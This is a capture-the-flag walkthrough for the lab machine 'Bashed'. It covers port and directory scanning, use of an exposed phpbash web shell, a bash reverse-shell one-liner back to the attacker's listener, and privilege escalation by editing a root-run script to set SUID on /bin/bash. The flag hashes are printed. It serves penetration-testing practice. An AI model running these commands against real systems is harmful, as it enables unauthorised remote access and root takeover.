![Bashed.PNG](/assets/Machines/Easy/Bashed/Bashed.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.68
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.68
```

**Output**
```bash
PORT   STATE SERVICE
80/tcp open  http
```

3. Visit web page

![web.PNG](/assets/Machines/Easy/Bashed/web.PNG)

4. If you search in the web page, you find **phpbash** file, now we can try to access this.

![phpbash.PNG](/assets/Machines/Easy/Bashed/phpbash.PNG)


5. With **gobuster** find directories or files in web page.
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Bashed]
└─| gobuster dir -u http://10.10.10.68 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Output**
```bash
/.hta                 (Status: 403) [Size: 290]
/.htpasswd            (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 295]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/index.html           (Status: 200) [Size: 7743]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]
/server-status        (Status: 403) [Size: 299]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
```

6. Visit `dev` directory

![dev.PNG](/assets/Machines/Easy/Bashed/dev.PNG)

7. Use `phpbash.php`

**Output**
![bash.PNG](/assets/Machines/Easy/Bashed/bash.PNG)

8. Run script to obtain a shell in yout terminal and manipulate more easy.

Script: `bash -c "bash -i >%26 /dev/tcp/<tun0 IP?/<Port> 0>%261`

9. Listen with **nc**
10. Run script in **phpbash.php**

11. You obtain shell
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Bashed]
└─| nc -lvnp 443                                          
listening on [any] 443 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.68] 49106
bash: cannot set terminal process group (847): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bashed:/home/arrexel$
```

12. Cat **user flag**
```bash
www-data@bashed:/home/arrexel$ cat user.txt 
67d0fe254ed0afaddb284b95495128c4
```

---
---
---
### **Privileges Escalation** 💀
1. List all files in `/scripts`
```bash
scriptmanager@bashed:/scripts$ ls
test.py  test.txt
```

2. Modify **test.py** to obtain permission SUID for `bash`
```python
import os;
os.system("chmod u+s /bin/bash")
```

3. Wait a moment and view permissions for `/bin/bash`
```bash
scriptmanager@bashed:/scripts$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
```

4. Spawn terminal how root
```bash
scriptmanager@bashed:/scripts$ bash -p 
bash-4.3# whoami
root
```

5. Cat **root flag**
```bash
bash-4.3# cat /root/root.txt 
5f15047807e32538a5b9d5d8447bba25
```